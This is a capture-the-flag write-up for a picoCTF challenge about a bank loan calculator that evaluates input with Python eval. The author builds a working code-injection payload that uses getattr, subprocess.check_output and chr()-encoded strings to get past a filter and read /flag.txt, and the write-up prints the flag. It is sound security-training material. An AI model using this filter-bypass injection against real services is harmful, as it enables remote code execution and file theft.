# URL
https://play.picoctf.org/practice/challenge/484?originalEvent=74&page=2&search=
# Challenge
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?

# Method of Solving
* So my initial thought process was how could I encode a commonly used injection: __import__('os').system('cat /flag.txt'))
* The hints provided some clues to me, notably: You might need encoding or dynamic construction to bypass restrictions.
* So, first to circumvent the dot restriction, I decided to use the Python getattr() function: getattr(__import__('o' + 's'), 'system')('cat /flag.txt') ->  retrieve the value of a named attribute from an object -> i.e, retrieve system
* However, os.system() does not return command output; if I wanted to output something, I needed subprocess, namely subprocess.check_output
* That line of reasoning led me to create this -> getattr(__import__('subprocess'), 'check_output')
* Now I need to create a way to cat /flag.txt without invoking the WAF
* Basic encoding can help me here cat -> Asciitable.com -> chr(99) + chr(97) + chr(116); / -> chr(47)
* The rest is dynamically constructed, then converts the byte output into a string.

```
getattr(__import__('subprocess'), 'check_output')([chr(99) + chr(97) + chr(116), chr(47) + 'f' + 'l' + 'a' + 'g' + '.' + 't' + 'x' + 't']).decode()
```
* This code returns the flag: picoCTF{D0nt_Use_Unsecure_f@nctionsb95fffac}
